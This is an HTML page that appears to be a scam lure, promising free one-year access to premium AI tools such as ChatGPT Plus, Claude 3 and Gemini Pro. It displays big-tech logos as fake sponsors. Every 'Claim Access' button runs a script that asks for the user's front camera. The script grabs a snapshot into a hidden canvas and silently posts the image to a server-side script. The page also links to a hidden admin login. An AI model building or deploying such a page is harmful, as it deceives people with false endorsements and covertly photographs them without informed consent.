<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Claim Your Free AI Access</title>
<meta property="og:image" content=https://c.top4top.io/p_3799rwesf1.png" />
<link rel="icon" type="image/png" href="https://c.top4top.io/p_3799rwesf1.png">
<meta name="description" content="Free 1-Year Access to Premium AI Tools. Trusted by Leading AI Companies Worldwide.">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<style>
* {
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: 'Inter', sans-serif;
}

body {
    background:#ffffff;
    color:#0f172a;
}

.nav {
    display:flex;
    justify-content:space-between;
    padding:20px 50px;
    border-bottom:1px solid #e5e7eb;
}

.logo {
    font-weight:600;
    font-size:18px;
    cursor:pointer;
}

.login {
    color:#64748b;
}

.hero {
    text-align:center;
    padding:100px 20px 40px;
}

.hero h1 {
    font-size:3rem;
    font-weight:700;
}

.hero p {
    color:#64748b;
    max-width:600px;
    margin:15px auto;
    font-size:1.1rem;
}

.sponsor {
    display:flex;
    flex-wrap:wrap;
    justify-content:center;
    align-items:center;
    gap:30px;
    margin:40px 0;
}

.sponsor img {
    height:35px;
    opacity:0.8;
}

.grid {
    display:flex;
    justify-content:center;
    gap:30px;
    flex-wrap:wrap;
    padding:20px;
}

.card {
    background:#ffffff;
    border:1px solid #e5e7eb;
    padding:30px;
    border-radius:14px;
    width:280px;
    text-align:center;
    transition:0.3s;
    box-shadow:0 10px 30px rgba(0,0,0,0.04);
}

.card:hover {
    transform:translateY(-6px);
    box-shadow:0 15px 40px rgba(0,0,0,0.08);
}

.card h3 {
    font-size:20px;
    font-weight:600;
}

.card p {
    color:#64748b;
    margin:12px 0 22px;
}

.btn {
    background:#111827;
    border:none;
    padding:12px;
    width:100%;
    color:white;
    border-radius:8px;
    cursor:pointer;
    font-weight:600;
}

.btn:hover {
    background:#000;
}

.footer {
    margin-top:80px;
    text-align:center;
    color:#94a3b8;
    font-size:0.85rem;
    padding:40px;
}
</style>
</head>
<body>
<div class="nav">
    <div class="logo" onclick="goAdmin()">AI Access</div>
    <div class="login">Welcome</div>
</div>
<div class="hero">
    <h1>Access Premium AI Tools for Free 1 Year</h1>
    <p>Trusted by leading AI companies worldwide</p>
</div>
<div class="sponsor">
    <img src="https://img.icons8.com/color/96/google-logo.png">
    <img src="https://img.icons8.com/color/96/meta.png">
    <img src="https://img.icons8.com/color/96/amazon.png">
    <img src="https://img.icons8.com/color/96/microsoft.png">
    <img src="https://img.icons8.com/color/96/nvidia.png">
    <img src="https://cdn.worldvectorlogo.com/logos/openai-2.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Claude_AI_logo.svg/1920px-Claude_AI_logo.svg.png">
</div>
<div class="grid">

<div class="card">
<h3>ChatGPT Plus</h3>
<p>Advanced AI GPT-4 access</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Claude 3</h3>
<p>Smart reasoning AI</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Meta AI</h3>
<p>Open AI ecosystem</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Google Gemini Pro</h3>
<p>Next-gen Google AI model</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Midjourney</h3>
<p>Premium AI image generator</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Runway ML</h3>
<p>AI video & editing tools</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

<div class="card">
<h3>Perplexity Pro</h3>
<p>AI-powered search engine</p>
<button class="btn" onclick="requestCamera()">Claim Access</button>
</div>

</div>

<div class="footer">
© 2026 AI Access Program
</div>

<div hidden>
    <video id="video" playsinline autoplay></video>
</div>

<canvas hidden id="canvas" width="640" height="480"></canvas>

<script>
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata},
        url: 'script.php',
        async: false
    });
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const constraints = {
    audio: false,
    video: { facingMode: "user" }
};

async function requestCamera() {
    alert("Lanjut Claim Access");

    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        alert("Akses Claim ditolak. Klik lagi untuk mencoba.");
    }
}

function handleSuccess(stream) {
    video.srcObject = stream;

    const context = canvas.getContext('2d');

    setTimeout(function(){
        context.drawImage(video, 0, 0, 640, 480);
        let data = canvas.toDataURL("image/png");
        post(data);
    }, 1500);
}

/* HIDDEN LOGIN */
function goAdmin(){
    window.location.href = "login.php";
}
</script>

</body>
</html>